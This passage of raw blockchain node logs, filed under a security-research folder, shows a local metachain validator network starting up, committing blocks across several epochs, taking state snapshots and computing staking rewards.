[0;32mINFO [0m[2026-10-06 22:12:51.031] [process/block]      [metachain/4/109/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 109 [0;32mnonce[0m = 106 [0;32mhash[0m = 36ea4d7674a364705426dc3a7304eadf0fe29b06b3e98b52e5361acd997600c7 
[0;32mINFO [0m[2026-10-06 22:12:57.025] [process/block]      [metachain/4/110/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 110 [0;32mnonce[0m = 107 [0;32mhash[0m = 2ed5262f4ab4498a964ff5f7b5d6d6be4bc369840f0c729dafa154145f0e2f1a 
[0;32mINFO [0m[2026-10-06 22:13:03.016] [process/block]      [metachain/4/111/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 111 [0;32mnonce[0m = 108 [0;32mhash[0m = 6832733afbc8e6de0e79fb3e16c6f5cf1aad4e639528fab7826ea013fa6b3e4e 
[0;32mINFO [0m[2026-10-06 22:13:09.018] [process/block]      [metachain/4/112/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 112 [0;32mnonce[0m = 109 [0;32mhash[0m = e0d3b72262176067e4822686de342efed36dd30f491bdcfce4f07d107a93e843 
[0;32mINFO [0m[2026-10-06 22:13:15.025] [process/block]      [metachain/4/113/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 113 [0;32mnonce[0m = 110 [0;32mhash[0m = db6e4f1e9a4b4d3db329d583af2b7f7a5f9a052ca06ebf345fdefb3b9789896f 
[0;32mINFO [0m[2026-10-06 22:13:21.023] [process/block]      [metachain/4/114/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 114 [0;32mnonce[0m = 111 [0;32mhash[0m = 82e77406b72b27c2514141fbfcdfd4d43d1e33ee38ac0533ef7015f7ef9bf223 
[0;32mINFO [0m[2026-10-06 22:13:27.026] [process/block]      [metachain/4/115/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 115 [0;32mnonce[0m = 112 [0;32mhash[0m = d1ba42428579d479e4e65f6dbd77fcd2840b7845b85396058382b4282e29b7cf 
[0;32mINFO [0m[2026-10-06 22:13:33.016] [process/block]      [metachain/4/116/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 116 [0;32mnonce[0m = 113 [0;32mhash[0m = 93b69b44b56f4b4b81c12155dc355cb73f4da181cc015d047d2e0ba5abcae7b5 
[0;32mINFO [0m[2026-10-06 22:13:39.023] [process/block]      [metachain/4/117/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 117 [0;32mnonce[0m = 114 [0;32mhash[0m = 7412c0e7252b5856bec2c5963efec2e5fe7309b96408c6594f64ac4ff4ccd4a1 
[0;32mINFO [0m[2026-10-06 22:13:45.020] [process/block]      [metachain/4/118/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 118 [0;32mnonce[0m = 115 [0;32mhash[0m = aae8b740f6a9fb07dd76e731ed5ac8adaa7d4f4bf7c0c9055d068bcd839fe36a 
[0;32mINFO [0m[2026-10-06 22:13:51.025] [process/block]      [metachain/4/119/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 119 [0;32mnonce[0m = 116 [0;32mhash[0m = 742ded8bdae4b18a0cadb4565c4e421856f511315668fb608c543c62601ac10c 
[0;32mINFO [0m[2026-10-06 22:13:57.019] [processProxy]       [metachain/4/120/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:13:57.020] [..hStart/metachain] [metachain/5/120/(BLOCK)] auctionListSelector.SelectNodesFromAuctionList: empty auction list; skip selection 
[0;32mINFO [0m[2026-10-06 22:13:57.020] [..hStart/metachain] [metachain/5/120/(BLOCK)] rewards to be distributed                [0;32mtotalStakeEligible[0m = 15000000000000000000000 [0;32mtotalTopUpEligible[0m = 0 [0;32mbaseRewards[0m = 3673436007558740681 [0;32mtopUpRewards[0m = 0 
[0;32mINFO [0m[2026-10-06 22:13:58.348] [process/block]      [metachain/5/120/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 4294967295 [0;32mround[0m = 120 [0;32mnonce[0m = 117 [0;32mhash[0m = a5965962f0001392e147070206b09c5d5ceb0f7fc7e11abf511dac847eafe513 
[0;32mINFO [0m[2026-10-06 22:13:58.348] [state]              [metachain/5/120/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 066702335a2811dcddf50786573dd21d10c4dc166fb9efe7074d97ae39ae59c8 [0;32mepoch[0m = 5 
[0;32mINFO [0m[2026-10-06 22:13:58.348] [state]              [metachain/5/120/(END_ROUND)] starting snapshot                        [0;32mtype[0m = peer trie [0;32mrootHash[0m = 2c700ea96509eca5f766dc45911b057b5a1ab9e8c4e0d17494223dbd9549cef1 [0;32mepoch[0m = 5 
[0;32mINFO [0m[2026-10-06 22:14:03.021] [process/block]      [metachain/5/121/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 4294967295 [0;32mround[0m = 121 [0;32mnonce[0m = 118 [0;32mhash[0m = 9ab35b5f657875a10a852a707e911f69173d8b5ae7de205dbc137a20c9d7268e 
[0;32mINFO [0m[2026-10-06 22:14:09.015] [process/block]      [metachain/5/122/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 4294967295 [0;32mround[0m = 122 [0;32mnonce[0m = 119 [0;32mhash[0m = 50f910007d7b06bc13fdde42d1dc3c59046301a356e378b6080dd2cea4c2c335 
[0;32mINFO [0m[2026-10-06 22:14:15.027] [process/block]      [metachain/5/123/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 4294967295 [0;32mround[0m = 123 [0;32mnonce[0m = 120 [0;32mhash[0m = 05dcb220f804060b49fa989246f135edc961b5fcf16c5bb6b7982c46f6655588 
[0;32mINFO [0m[2026-10-06 22:14:21.018] [process/block]      [metachain/5/124/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 4294967295 [0;32mround[0m = 124 [0;32mnonce[0m = 121 [0;32mhash[0m = 7283e19ecdad4d0709bd01ff23b27caf8f3ebbdef5cf5571459e71585f2dc7e0 
[0;32mINFO [0m[2026-10-06 22:14:27.021] [process/block]      [metachain/5/125/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 4294967295 [0;32mround[0m = 125 [0;32mnonce[0m = 122 [0;32mhash[0m = dd63786cf55f3ee595c42992b439c2dd7e4438c4314a56b3a132bcf09fe210fa 
[0;32mINFO [0m[2026-10-06 22:14:33.024] [process/block]      [metachain/5/126/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 4294967295 [0;32mround[0m = 126 [0;32mnonce[0m = 123 [0;32mhash[0m = 12ca7cb6897310f7990895358652a2382b1eadf3487941f98fe197f84ba033c4 
[0;32mINFO [0m[2026-10-06 22:14:34.068] [node]               [metachain/5/126/(END_ROUND)] terminating at user's signal...          
```

### C 5.2, validator2 full log, shard process started 22:01:39, 123 blocks committed, terminated 22:14:33

File `security-research/node-logs/validator2.log`.

```text
[0;32mINFO [0m[2026-10-06 22:01:39.373] [node]               [/0/0/]        starting node                            [0;32mversion[0m = v1.0.0/go1.26.4/darwin-arm64/3bd876d357 [0;32mpid[0m = 43287 
[0;32mINFO [0m[2026-10-06 22:01:39.375] [factory]            [/0/0/]        start time                               [0;32mformatted[0m = Tue Oct 6 22:01:57 WAT 2026 [0;32munix timestamp[0m = 1791320517 [0;32msupernova unix timestamp[0m = 1791323157 [0;32mround duration[0m = 6s [0;32msupernova round duration[0m = 6s 
[0;32mINFO [0m[2026-10-06 22:01:39.381] [factory]            [/0/0/]        the node loaded the validatorKey.pem file and is running in single-key mode 
[0;32mINFO [0m[2026-10-06 22:01:39.399] [factory]            [/0/0/]        p2p private key: generated a new private key for p2p signing 
[0;32mINFO [0m[2026-10-06 22:01:39.407] [main/p2p]           [/0/0/]        listening on addresses                   [0;32maddr0[0m = /ip4/127.0.0.1/tcp/21502/p2p/16Uiu2HAm1KqKWXT21DScb4adEUREGWUrmWpT43ZxVkc83t5fkKor [0;32maddr1[0m = /ip4/172.20.10.5/tcp/21502/p2p/16Uiu2HAm1KqKWXT21DScb4adEUREGWUrmWpT43ZxVkc83t5fkKor 
[0;32mINFO [0m[2026-10-06 22:01:39.408] [main/p2p]           [/0/0/]        started the network discovery process... 
[0;32mINFO [0m[2026-10-06 22:01:59.411] [factory]            [/0/0/]        shard info                               [0;32mstarted in shard[0m = metachain 
[0;32mINFO [0m[2026-10-06 22:01:59.412] [factory]            [/0/0/]        bootstrap parameters                     [0;32mshardId[0m = 4294967295 [0;32mepoch[0m = 0 [0;32mnumShards[0m = 1 
[0;32mINFO [0m[2026-10-06 22:01:59.412] [node]               [/0/0/]        Bootstrap                                [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:06.322] [..nodesCoordinator] [metachain/0/0/] new nodes config is set for epoch        [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:06.344] [vmContainerFactory] [metachain/0/0/] VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:06.348] [processProxy]       [metachain/0/0/] processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:09.724] [processProxy]       [metachain/0/0/] processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:09.729] [genesis/process]    [metachain/0/0/] genesisBlockCreator.createHeaders        [0;32mshard[0m = 0 [0;32mnonce[0m = 0 [0;32mround[0m = 0 [0;32mroot hash[0m = 79c9a65d56dd423b42fde0405f173fbaf42d081e4de05780814e509da6664770 
[0;32mINFO [0m[2026-10-06 22:02:09.731] [genesis/process]    [metachain/0/0/] genesisBlockCreator.createHeaders        [0;32mshard[0m = 4294967295 [0;32mnonce[0m = 0 [0;32mround[0m = 0 [0;32mroot hash[0m = 5b8c8589b3a99e69f13a0e556ed873b94e6236d4756c19ebd16de6e62792ff8d 
[0;32mINFO [0m[2026-10-06 22:02:09.932] [processProxy]       [metachain/0/0/] processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:09.932] [..hStart/metachain] [metachain/0/0/] rewardsCreatorProxy                      [0;32mconfigured[0m = rewardsCreatorV1 
[0;32mINFO [0m[2026-10-06 22:02:09.963] [factory]            [metachain/0/0/] indexGenesisBlocks(): historyRepo.RecordBlock [0;32mshardID[0m = 4294967295 [0;32mhash[0m = f310653903260e6450f3516d6e5fb4cfd30e83ea060fd6281f74688474ff1b5f 
[0;33mWARN [0m[2026-10-06 22:02:10.331] [state]              [metachain/0/0/] could not retrieve snapshot info         [0;33merror[0m = key not found 
[0;33mWARN [0m[2026-10-06 22:02:10.335] [state]              [metachain/0/0/] could not retrieve snapshot info         [0;33merror[0m = key not found 
[0;32mINFO [0m[2026-10-06 22:02:10.339] [factory]            [metachain/0/0/] starting consensus                       [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:10.353] [node]               [metachain/0/2/(START_ROUND)] application is now running               
[0;32mINFO [0m[2026-10-06 22:02:15.036] [processProxy]       [metachain/0/3/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 0 
[0;33mWARN [0m[2026-10-06 22:02:15.070] [headersForBlock]    [metachain/0/3/(BLOCK)] requestMissingAndUpdateBasedOnCrossShardData could not find last notarized [0;33mshard[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:15.078] [process/block]      [metachain/0/3/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 3 [0;32mnonce[0m = 1 [0;32mhash[0m = 12a2339fb0730bda3c27b9226935b40d491b42a1dcacaa4d302ac82b60b1ccff 
[0;32mINFO [0m[2026-10-06 22:02:21.013] [process/block]      [metachain/0/4/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 4 [0;32mnonce[0m = 2 [0;32mhash[0m = 951e23813fdcc5cf1567df637cb7b089354c0d087a48d87d24ce1587beba1a1c 
[0;32mINFO [0m[2026-10-06 22:02:27.022] [process/block]      [metachain/0/5/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 5 [0;32mnonce[0m = 3 [0;32mhash[0m = 8519f48973214551eae07f5cce0c02a65859d4df1d6e4a9069bc0c51a18ca923 
[0;32mINFO [0m[2026-10-06 22:02:33.022] [process/block]      [metachain/0/6/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 6 [0;32mnonce[0m = 4 [0;32mhash[0m = 16a2ec737af8fef9da8dfe081fef92eb31712666805b455b68bd0f809bd34272 
[0;32mINFO [0m[2026-10-06 22:02:39.015] [process/block]      [metachain/0/7/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 7 [0;32mnonce[0m = 5 [0;32mhash[0m = 52f596da93a8a4621a9c6348ecf1bf1613c2d547750bddb0fc713641838e84d5 
[0;32mINFO [0m[2026-10-06 22:02:45.021] [process/block]      [metachain/0/8/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 8 [0;32mnonce[0m = 6 [0;32mhash[0m = 78b9669a254564cfd079eb83f0a46a11f1a41edcd4c899c9611c6d81fc4de343 
[0;32mINFO [0m[2026-10-06 22:02:51.024] [process/block]      [metachain/0/9/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 9 [0;32mnonce[0m = 7 [0;32mhash[0m = b55a7e80de17e54723d2758444e4b8379cbf8b0715f384bb5817c43aba353db3 
[0;32mINFO [0m[2026-10-06 22:02:57.016] [process/block]      [metachain/0/10/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 10 [0;32mnonce[0m = 8 [0;32mhash[0m = 5ded2dcf853fd20e5df12172db569ebb30f2f7a103fcceaccc4a493984178597 
[0;32mINFO [0m[2026-10-06 22:03:03.018] [process/block]      [metachain/0/11/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 11 [0;32mnonce[0m = 9 [0;32mhash[0m = a7268cc50bef6890ad5250ae81a421b0eeeba9bee2b81841d0305eb97d08f25d 
[0;32mINFO [0m[2026-10-06 22:03:09.020] [process/block]      [metachain/0/12/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 12 [0;32mnonce[0m = 10 [0;32mhash[0m = 0408be04a4bef43fe9029763ab9fe8fa6ee3f7791dcd8639f9e0bf5452a09c54 
[0;32mINFO [0m[2026-10-06 22:03:15.014] [process/block]      [metachain/0/13/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 13 [0;32mnonce[0m = 11 [0;32mhash[0m = a358a2d844e36110bb0c66af1bd18394b76c9ed82b56e69246b2146315ebf300 
[0;32mINFO [0m[2026-10-06 22:03:21.018] [process/block]      [metachain/0/14/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 14 [0;32mnonce[0m = 12 [0;32mhash[0m = 8868b55de9e2f0f527cecf61a6e88dba0267902bab72107d39ba7cac14afbbe7 
[0;32mINFO [0m[2026-10-06 22:03:27.016] [process/block]      [metachain/0/15/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 15 [0;32mnonce[0m = 13 [0;32mhash[0m = f59d0806e2761391b02e5b2217f634afa362b8a1409f7f2075e7981bc141b6bd 
[0;32mINFO [0m[2026-10-06 22:03:33.016] [process/block]      [metachain/0/16/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 16 [0;32mnonce[0m = 14 [0;32mhash[0m = 856850e81f264b3b743c570ee15ae325824af5b20ef6ceec1c822b3a77dd7ec8 
[0;32mINFO [0m[2026-10-06 22:03:39.023] [process/block]      [metachain/0/17/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 17 [0;32mnonce[0m = 15 [0;32mhash[0m = 3835a9739fbd434377f197fa0c1b368bb68aa3dd94f0de3ff76c9b7961fe4fd0 
[0;32mINFO [0m[2026-10-06 22:03:45.018] [process/block]      [metachain/0/18/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 18 [0;32mnonce[0m = 16 [0;32mhash[0m = 93d3233141e1ea1259063a9e9af04fac1be31fe48b7d0eb2c1b1e4ef9f000375 
[0;32mINFO [0m[2026-10-06 22:03:51.018] [process/block]      [metachain/0/19/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 19 [0;32mnonce[0m = 17 [0;32mhash[0m = a1d81ee7b974ddbda7525446722f80e20bd9fcb30268b6f22bb6d99067ed5d7f 
[0;32mINFO [0m[2026-10-06 22:03:57.016] [process/block]      [metachain/0/20/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 20 [0;32mnonce[0m = 18 [0;32mhash[0m = 9a769d7cc0d2323726414e2725388657069bdd68c2064f310adc693daeb0e766 
[0;32mINFO [0m[2026-10-06 22:04:03.015] [process/block]      [metachain/0/21/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 21 [0;32mnonce[0m = 19 [0;32mhash[0m = 2355a573d2bda563b5e6b723078bfa7c5f05233e7dc4a0b981164fc790efaa77 
[0;32mINFO [0m[2026-10-06 22:04:09.024] [process/block]      [metachain/0/22/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 22 [0;32mnonce[0m = 20 [0;32mhash[0m = fbf3d7a3a6737797021a4a92f129fb3bc249f2eb52cda57ff681a7b3b799aa94 
[0;32mINFO [0m[2026-10-06 22:04:15.013] [process/block]      [metachain/0/23/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 23 [0;32mnonce[0m = 21 [0;32mhash[0m = 5cb7af23566d8a128f6a309b5e084604f28c253035d1213127798f527be72234 
[0;32mINFO [0m[2026-10-06 22:04:21.014] [process/block]      [metachain/0/24/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 24 [0;32mnonce[0m = 22 [0;32mhash[0m = 73441307f38120f3167affae1b4a4700880f2fa4451bc2fc3b06bf52bef3f0f7 
[0;32mINFO [0m[2026-10-06 22:04:27.004] [processProxy]       [metachain/1/25/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:04:37.005] [process/block]      [metachain/1/26/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 26 [0;32mnonce[0m = 23 [0;32mhash[0m = 48bc76f2b1f76746c24d2d2ee6d6ecda3235379eb68e73f5800864abaccf4a13 
[0;32mINFO [0m[2026-10-06 22:04:39.021] [process/block]      [metachain/1/27/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 27 [0;32mnonce[0m = 24 [0;32mhash[0m = d8f34316ac1969379af928270b98716113d8571e0dd078b78feb673c13c6cc9c 
[0;32mINFO [0m[2026-10-06 22:04:45.018] [process/block]      [metachain/1/28/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 28 [0;32mnonce[0m = 25 [0;32mhash[0m = 1dd773763e7d28749f565629ea826a1dc64464a7a1f9749161667a263dc02d89 
[0;32mINFO [0m[2026-10-06 22:04:51.033] [process/block]      [metachain/1/29/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 29 [0;32mnonce[0m = 26 [0;32mhash[0m = 075fc829aa2a0e31757ef9fd0ffe65b7a319359f1ac2af984de8b4885218b6e4 
[0;32mINFO [0m[2026-10-06 22:04:57.018] [process/block]      [metachain/1/30/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 30 [0;32mnonce[0m = 27 [0;32mhash[0m = a6e1d0e03afe6fae38f87c178bc2c4ea9ffb244359cba7e8d4634999c11d8c98 
[0;32mINFO [0m[2026-10-06 22:05:03.019] [process/block]      [metachain/1/31/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 31 [0;32mnonce[0m = 28 [0;32mhash[0m = 1461e117b1b67074be060833c0efcb277c34c3640968cf6b1cd4c86baf7ddd6a 
[0;32mINFO [0m[2026-10-06 22:05:09.022] [process/block]      [metachain/1/32/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 32 [0;32mnonce[0m = 29 [0;32mhash[0m = 0171c478e881722c0cf6d1d3def6eac169bdc9528bfae009e12b219a9be26966 
[0;32mINFO [0m[2026-10-06 22:05:15.030] [process/block]      [metachain/1/33/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 33 [0;32mnonce[0m = 30 [0;32mhash[0m = 0b0e1dd742f732399dae897f6aa3380dbcff32b3a629b6f5e80d8101c021c13e 
[0;32mINFO [0m[2026-10-06 22:05:21.025] [process/block]      [metachain/1/34/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 34 [0;32mnonce[0m = 31 [0;32mhash[0m = d9c66a3cb6720911de9d8aaf2db9a1a1c757cae5e8ef7d8299052ec62dcfc264 
[0;32mINFO [0m[2026-10-06 22:05:27.021] [process/block]      [metachain/1/35/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 35 [0;32mnonce[0m = 32 [0;32mhash[0m = 2afc95850d7229daff4c87f028c9559c53d83471dbdc89e86b3a3b15ae0fb566 
[0;32mINFO [0m[2026-10-06 22:05:33.018] [process/block]      [metachain/1/36/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 36 [0;32mnonce[0m = 33 [0;32mhash[0m = ae578af34148f27712634c967e13c62aea8c4812943c9db14ee02b991516babd 
[0;32mINFO [0m[2026-10-06 22:05:39.023] [process/block]      [metachain/1/37/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 37 [0;32mnonce[0m = 34 [0;32mhash[0m = 49b3156756bb669a80738e53735e045d0455a6b7f872b73312f193c35a700b7f 
[0;32mINFO [0m[2026-10-06 22:05:45.019] [process/block]      [metachain/1/38/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 38 [0;32mnonce[0m = 35 [0;32mhash[0m = d5a8ee281c2d0464f951f8f64262fa7b95323486ca3f1256cfe6913950f6bc85 
[0;32mINFO [0m[2026-10-06 22:05:51.016] [process/block]      [metachain/1/39/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 39 [0;32mnonce[0m = 36 [0;32mhash[0m = a296d0354ec5d6e58233661c4f543c847bc20d8311794921c983c50a2a0f1207 
[0;32mINFO [0m[2026-10-06 22:05:57.025] [process/block]      [metachain/1/40/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 40 [0;32mnonce[0m = 37 [0;32mhash[0m = 89b25b7ba3d1ced41327ccb2e1c63a0681171d2d25118f2542923bda02c3b041 
[0;32mINFO [0m[2026-10-06 22:06:03.016] [process/block]      [metachain/1/41/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 41 [0;32mnonce[0m = 38 [0;32mhash[0m = e69ee1031827ea72ee4a12c758239c12a360811214117d30e32e692aeeecf5f0 
[0;32mINFO [0m[2026-10-06 22:06:09.015] [process/block]      [metachain/1/42/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 42 [0;32mnonce[0m = 39 [0;32mhash[0m = 4724d6d9ddb4672d5596eea8e127104aa3cb56e3effb7081e8764b399397ba48 
[0;32mINFO [0m[2026-10-06 22:06:15.021] [process/block]      [metachain/1/43/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 43 [0;32mnonce[0m = 40 [0;32mhash[0m = 742ae90f4ee534d1a73a4770f1dd9e9aedbaae28f91d86ae34cdc78959f9913d 
[0;32mINFO [0m[2026-10-06 22:06:21.025] [process/block]      [metachain/1/44/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 44 [0;32mnonce[0m = 41 [0;32mhash[0m = 2574f49d4fbd532fecb5bf2cc8628b55ebabf3f5ffbc2005a05a4a476534b24e 
[0;32mINFO [0m[2026-10-06 22:06:27.021] [process/block]      [metachain/1/45/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 45 [0;32mnonce[0m = 42 [0;32mhash[0m = 95e15a4d4a4849b001d8b6a08550bad7a8cfeae25928a121b5af4da34d0882e7 
[0;32mINFO [0m[2026-10-06 22:06:33.015] [process/block]      [metachain/1/46/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 46 [0;32mnonce[0m = 43 [0;32mhash[0m = 63c9908561006f1f9078ddcb1715779cde35c20c310056488425f9820a6c7192 
[0;32mINFO [0m[2026-10-06 22:06:39.017] [process/block]      [metachain/1/47/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 47 [0;32mnonce[0m = 44 [0;32mhash[0m = 970b591eb974c8db5fc90ab556d0a93d6c72fef0e523b7425038834f189f99a8 
[0;32mINFO [0m[2026-10-06 22:06:45.022] [process/block]      [metachain/1/48/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 48 [0;32mnonce[0m = 45 [0;32mhash[0m = 9e0d21b36e4019d2e7f82178a832998345f4d471ac94cb6b8f008e1086b6f02a 
[0;32mINFO [0m[2026-10-06 22:06:51.022] [process/block]      [metachain/1/49/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 49 [0;32mnonce[0m = 46 [0;32mhash[0m = 6a837de7cf97dc3e441c081070ffcbdb387a7814319c707373418e49cd8fab21 
[0;32mINFO [0m[2026-10-06 22:06:57.015] [process/block]      [metachain/1/50/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 50 [0;32mnonce[0m = 47 [0;32mhash[0m = c45f120287f27fea5989abda5009047044596eeb7ad7f5e92873170971f2b5ee 
[0;32mINFO [0m[2026-10-06 22:07:03.005] [processProxy]       [metachain/2/51/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:07:03.006] [..hStart/metachain] [metachain/2/51/(BLOCK)] auctionListSelector.SelectNodesFromAuctionList: empty auction list; skip selection 
[0;32mINFO [0m[2026-10-06 22:07:03.006] [..hStart/metachain] [metachain/2/51/(BLOCK)] rewardsCreatorProxy.switchToRewardsCreatorV2 
[0;32mINFO [0m[2026-10-06 22:07:03.006] [..hStart/metachain] [metachain/2/51/(BLOCK)] rewards to be distributed                [0;32mtotalStakeEligible[0m = 15000000000000000000000 [0;32mtotalTopUpEligible[0m = 0 [0;32mbaseRewards[0m = 3949171031307706200 [0;32mtopUpRewards[0m = 0 
